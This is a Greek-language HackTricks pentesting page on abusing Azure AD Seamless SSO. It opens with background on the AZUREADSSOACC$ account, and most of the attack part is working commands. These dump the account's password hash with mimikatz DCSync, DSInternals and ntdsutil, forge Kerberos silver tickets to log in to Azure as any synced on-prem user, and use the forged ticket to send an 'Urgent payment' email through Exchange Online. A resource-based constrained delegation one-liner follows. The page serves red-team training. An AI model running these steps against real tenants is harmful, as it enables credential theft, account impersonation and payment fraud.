# Az - Seamless SSO

{% hint style="success" %}
Μάθετε και εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε και εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}

## Βασικές Πληροφορίες

[Από τα έγγραφα:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sso) Το Azure Active Directory Seamless Single Sign-On (Azure AD Seamless SSO) συνδέει αυτόματα τους χρήστες όταν βρίσκονται στις εταιρικές τους συσκευές συνδεδεμένες στο εταιρικό σας δίκτυο. Όταν είναι ενεργοποιημένο, οι χρήστες δεν χρειάζεται να πληκτρολογήσουν τους κωδικούς πρόσβασής τους για να συνδεθούν στο Azure AD, και συνήθως, ούτε καν τα ονόματα χρήστη τους. Αυτή η δυνατότητα παρέχει στους χρήστες σας εύκολη πρόσβαση στις εφαρμογές σας που βασίζονται στο cloud χωρίς να χρειάζονται επιπλέον στοιχεία on-premises.

<figure><img src="../../../../.gitbook/assets/image (275).png" alt=""><figcaption></figcaption></figure>

Βασικά, το Azure AD Seamless SSO συνδέει τους χρήστες όταν βρίσκονται σε έναν υπολογιστή συνδεδεμένο σε on-prem domain.

Υποστηρίζεται τόσο από [**PHS (Password Hash Sync)**](phs-password-hash-sync.md) όσο και από [**PTA (Pass-through Authentication)**](pta-pass-through-authentication.md).

Το Desktop SSO χρησιμοποιεί **Kerberos** για αυθεντικοποίηση. Όταν διαμορφώνεται, το Azure AD Connect δημιουργεί έναν **λογαριασμό υπολογιστή που ονομάζεται AZUREADSSOACC`$`** στο on-prem AD. Ο κωδικός πρόσβασης του λογαριασμού `AZUREADSSOACC$` αποστέλλεται ως απλό κείμενο στο Azure AD κατά τη διαμόρφωση.

Τα **εισιτήρια Kerberos** είναι **κρυπτογραφημένα** χρησιμοποιώντας το **NTHash (MD4)** του κωδικού πρόσβασης και το Azure AD χρησιμοποιεί τον αποσταλμένο κωδικό πρόσβασης για να αποκρυπτογραφήσει τα εισιτήρια.

Το **Azure AD** εκθέτει ένα **endpoint** (https://autologon.microsoftazuread-sso.com) που δέχεται εισιτήρια **Kerberos**. Ο περιηγητής του μηχανήματος συνδεδεμένου στο domain προωθεί τα εισιτήρια σε αυτό το endpoint για SSO.

### On-prem -> cloud

Ο **κωδικός πρόσβασης** του χρήστη **`AZUREADSSOACC$` δεν αλλάζει ποτέ**. Επομένως, ένας διαχειριστής domain θα μπορούσε να παραβιάσει το **hash αυτού του λογαριασμού**, και στη συνέχεια να το χρησιμοποιήσει για να **δημιουργήσει silver tickets** για να συνδεθεί στο Azure με **οποιονδήποτε συγχρονισμένο on-prem χρήστη**:
```powershell
# Dump hash using mimikatz
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\azureadssoacc$ /domain:domain.local /dc:dc.domain.local"'
mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit

# Dump hash using https://github.com/MichaelGrafnetter/DSInternals
Get-ADReplAccount -SamAccountName 'AZUREADSSOACC$' -Domain contoso -Server lon-dc1.contoso.local

# Dump using ntdsutil and DSInternals
## Dump NTDS.dit
ntdsutil "ac i ntds" "ifm” "create full C:\temp" q q
## Extract password
Install-Module DSInternals
Import-Module DSInternals
$key = Get-BootKey -SystemHivePath 'C:\temp\registry\SYSTEM'
(Get-ADDBAccount -SamAccountName 'AZUREADSSOACC$' -DBPath 'C:\temp\Active Directory\ntds.dit' -BootKey $key).NTHash | Format-Hexos
```
Με το hash μπορείτε τώρα να **δημιουργήσετε silver tickets**:
```powershell
# Get users and SIDs
Get-AzureADUser | Select UserPrincipalName,OnPremisesSecurityIdentifier

# Create a silver ticket to connect to Azure with mimikatz
Invoke-Mimikatz -Command '"kerberos::golden /user:onpremadmin /sid:S-1-5-21-123456789-1234567890-123456789 /id:1105 /domain:domain.local /rc4:<azureadssoacc hash> /target:aadg.windows.net.nsatc.net /service:HTTP /ptt"'
mimikatz.exe "kerberos::golden /user:elrond /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234 /domain:contoso.local /rc4:12349e088b2c13d93833d0ce947676dd /target:aadg.windows.net.nsatc.net /service:HTTP /ptt" exit

# Create silver ticket with AADInternal to access Exchange Online
$kerberos=New-AADIntKerberosTicket -SidString "S-1-5-21-854168551-3279074086-2022502410-1104" -Hash "097AB3CBED7B9DD6FE6C992024BC38F4"
$at=Get-AADIntAccessTokenForEXO -KerberosTicket $kerberos -Domain company.com
## Send email
Send-AADIntOutlookMessage -AccessToken $at -Recipient "someone@company.com" -Subject "Urgent payment" -Message "<h1>Urgent!</h1><br>The following bill should be paid asap."
```
Για να χρησιμοποιήσετε το silver ticket, πρέπει να εκτελεστούν τα παρακάτω βήματα:

1. **Εκκίνηση του Browser:** Πρέπει να εκκινήσετε τον Mozilla Firefox.
2. **Διαμόρφωση του Browser:**
* Μεταβείτε στο **`about:config`**.
* Ορίστε την προτίμηση για [network.negotiate-auth.trusted-uris](https://github.com/mozilla/policy-templates/blob/master/README.md#authentication) στις καθορισμένες [τιμές](https://docs.microsoft.com/en-us/azure/active-directory/connect/active-directory-aadconnect-sso#ensuring-clients-sign-in-automatically):
* `https://aadg.windows.net.nsatc.net`
* `https://autologon.microsoftazuread-sso.com`
3. **Πρόσβαση στην Web Εφαρμογή:**
* Επισκεφθείτε μια web εφαρμογή που είναι ενσωματωμένη με το AAD domain του οργανισμού. Ένα κοινό παράδειγμα είναι το [Office 365](https://portal.office.com/).
4. **Διαδικασία Αυθεντικοποίησης:**
* Στην οθόνη σύνδεσης, πρέπει να εισαχθεί το όνομα χρήστη, αφήνοντας το πεδίο του κωδικού πρόσβασης κενό.
* Για να προχωρήσετε, πατήστε είτε TAB είτε ENTER.

{% hint style="success" %}
Αυτό δεν παρακάμπτει το MFA αν είναι ενεργοποιημένο
{% endhint %}

#### ~~Δημιουργία Kerberos tickets για χρήστες μόνο στο cloud~~ <a href="#creating-kerberos-tickets-for-cloud-only-users" id="creating-kerberos-tickets-for-cloud-only-users"></a>

Εάν οι διαχειριστές του Active Directory έχουν πρόσβαση στο Azure AD Connect, μπορούν **να ορίσουν SID για οποιονδήποτε χρήστη στο cloud**. Με αυτόν τον τρόπο, τα Kerberos **tickets** μπορούν να **δημιουργηθούν και για χρήστες μόνο στο cloud**. Η μόνη απαίτηση είναι ότι το SID είναι ένα σωστό [SID](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc778824\(v=ws.10\)).

{% hint style="danger" %}
Η αλλαγή του SID των διαχειριστών μόνο στο cloud είναι τώρα **αποκλεισμένη από τη Microsoft**.\
Για πληροφορίες, ελέγξτε [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
{% endhint %}

### On-prem -> Cloud μέσω Resource Based Constrained Delegation <a href="#creating-kerberos-tickets-for-cloud-only-users" id="creating-kerberos-tickets-for-cloud-only-users"></a>

Οποιοσδήποτε μπορεί να διαχειριστεί λογαριασμούς υπολογιστών (`AZUREADSSOACC$`) στο container ή OU που βρίσκεται αυτός ο λογαριασμός, μπορεί **να διαμορφώσει μια resource based constrained delegation πάνω στον λογαριασμό και να έχει πρόσβαση σε αυτόν**.
```python
python rbdel.py -u <workgroup>\\<user> -p <pass> <ip> azureadssosvc$
```
## Αναφορές

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso)
* [https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/](https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/)
* [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
* [TR19: I'm in your cloud, reading everyone's emails - hacking Azure AD via Active Directory](https://www.youtube.com/watch?v=JEIR5oGCwdg)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Δείτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Γίνετε μέλος της** 💬 [**ομάδας Discord**](https://discord.gg/hRep4RUj7f) ή της [**ομάδας telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}
